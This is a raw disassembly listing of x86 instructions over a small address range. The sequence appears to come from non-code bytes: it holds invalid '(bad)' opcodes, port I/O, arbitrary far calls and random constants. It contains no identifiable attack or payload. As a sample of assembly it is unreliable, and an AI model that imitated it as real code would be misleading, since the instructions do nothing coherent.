  428517:	mov    ebp,0x39566564
  42851c:	push   ecx
  42851d:	push   DWORD PTR [ecx+ebp*4-0x30]
  428521:	int    0xea
  428523:	pop    eax
  428524:	xchg   BYTE PTR [ecx+0x5d207a77],dh
  42852a:	ss pop ss
  42852c:	or     al,0x91
  42852e:	outs   dx,BYTE PTR ds:[esi]
  42852f:	mov    al,0x5c
  428531:	(bad)  
  428532:	scas   eax,DWORD PTR es:[edi]
  428533:	fwait
  428534:	or     DWORD PTR [edi+0x4fdb7426],ebp
  42853a:	leave  
  42853b:	jg     0x428530
  42853d:	mov    ebx,0xb1615cab
  428542:	test   DWORD PTR [eiz*4-0x103ed88c],edx
  428549:	popa   
  42854a:	retf   
  42854b:	mov    ebp,0x876c96e7
  428550:	mov    BYTE PTR [ebx+0x2e],dh
  428553:	rcr    DWORD PTR [ecx-0x63eedb97],0xcc
  42855a:	sbb    ebx,0x98ea9a43
  428560:	mov    eax,ds:0x341ce99a
  428565:	jns    0x428511
  428567:	dec    eax
  428568:	(bad)  
  42856a:	xchg   BYTE PTR [ebp-0x7e],cl
  42856d:	rcr    DWORD PTR [ebx-0x6f],1
  428570:	loope  0x428536
  428572:	add    al,0x7d
  428574:	pushf  
  428575:	mov    ebx,0xcec459d4
  42857a:	push   edi
  42857b:	push   edx
  42857c:	push   esp
  42857d:	dec    edx
  42857e:	push   ss
  42857f:	mov    eax,0xa8a971c4
  428584:	adc    BYTE PTR [edi+eax*1+0x16],0x37
  428589:	shl    edx,1
  42858b:	mov    ebx,0xc5254d0c
  428590:	inc    ebx
  428591:	cli    
  428592:	leave  
  428593:	dec    ebx
  428594:	pop    ds
  428595:	jle    0x428534
  428597:	fist   DWORD PTR [esi+0x7a]
  42859a:	adc    bh,ah
  42859c:	(bad)  
  42859d:	fnstenv [eax+edx*2]
  4285a0:	xor    DWORD PTR [esi],0x44
  4285a3:	lods   al,BYTE PTR ds:[esi]
  4285a4:	mov    bl,0xf3
  4285a6:	xlat   BYTE PTR ds:[ebx]
  4285a7:	jns    0x4285fd
  4285a9:	call   0x9189:0x7b5beb72
  4285b0:	or     eax,0x341d2919
  4285b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4285b6:	out    0x4,al
  4285b8:	(bad)  
  4285b9:	xchg   ecx,eax
  4285ba:	out    dx,eax
  4285bb:	call   0x4b52:0x39536bf6
  4285c2:	in     al,0x3c
  4285c4:	data16 ror BYTE PTR [ebx+0x6d],1
  4285c8:	iret   
  4285c9:	adc    BYTE PTR [esi],ah
  4285cb:	jbe    0x428563
  4285cd:	pusha  
  4285ce:	mov    ebp,ebp
  4285d0:	or     esi,edx
  4285d2:	push   cs
	...
